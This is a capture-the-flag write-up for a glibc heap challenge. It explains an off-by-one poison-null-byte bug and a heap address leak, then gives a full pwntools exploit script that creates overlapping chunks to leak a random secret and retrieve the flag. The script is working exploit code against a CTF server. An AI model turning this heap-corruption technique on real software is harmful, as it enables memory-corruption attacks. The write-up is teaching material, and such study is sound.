# Santa's Workshop writeup

## Description
Explore Santa's magical gift workshop and uncover the mysteries of the North Pole. Ho Ho Ho!

We are given a Google Drive link with the binaries ```chall```, ```libc.so.6``` and ```ld-linux-x86-64.so.2```

## Static analysis
- checksec: All the mitigations are used
```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
```

- Reverse engineering: The binary allows us to perform various actions on the heap including
    
    1. malloc a chunk of size in range (0x50 and 0x1000)
    2. write to a chunk
    3. read from a chunk
    4. free the chunk (and the pointer and size are nulled as well so no use-after-free)
    5. master-key: check if our input matches a random 16 bytes from /dev/urandom, can only be called after load-secret. If it matches, print the flag
    6. load-secret: generate 16 random bytes and store them on the heap and a global variable.

- The main goal of us now is to somehow leak the secret random 16 bytes on the heap/ on the global variable to achieve win()

- Vulnerabilities: There are two main vulnerabilities in this binary

    1. Free heap leak: The binary freely gives us the heap address at the beginning
    2. Off by one null byte (poison null byte). At address 1A3E, the byte after our input is set to null. As our input can reach the final byte of the corresponding heap chunk, we can null out a single byte in the next chunk (which is the least significant byte of the ```size``` field). This situation is commonly known as poison null byte.

## Exploitation
- Using poison null byte technique, combining with the ability to malloc, free, read and write to chunk, we can achieve the overlapping chunks as detailed in https://github.com/shellphish/how2heap/blob/master/glibc_2.35/poison_null_byte.c

- By doing so, we can call load-secret with the chunk storing the secret be the same as a chunk of us, which allows secret leaking.

```python
#!/usr/bin/env python3

from pwn import *


p = remote('remote.infoseciitr.in', 8000)

def malloc(id, sz):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Slot: ', str(id).encode())
    p.sendlineafter(b'Size: ', str(sz).encode())

def free(id):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Slot: ', str(id).encode())

def read(id, sz):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Slot: ', str(id).encode())
    p.recvuntil(b'Contents: ')
    return p.recv(sz)

def write(id, payload):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Slot: ', str(id).encode())
    p.sendafter(b'Message: ', payload)

# Leak heap
p.recvuntil(b'Ho...Ho...Ho..')
heap_base = int(p.recvline().strip().decode(), 16)
log.info(f"Heap_leak: {hex(heap_base)}")

# Off by one null byte -> overlapping chunks
malloc(0, 0x58)
malloc(1, 0x4f8)
malloc(2, 0x50)
write(0, p64(heap_base + 0x20) + p64(0x51) + p64(heap_base + 0x8) + p64(heap_base + 0x10) + b'A' * 0x30 + p64(0x50))
free(1)

# Load secret
p.sendlineafter(b'> ', b'6')

# Leak secret
secret = read(0, 32)[16:]
log.info(f"Secret: {secret}")

# Submit secret
p.sendlineafter(b'> ', b'5')
p.sendafter(b'Code: ', secret)

p.interactive()
```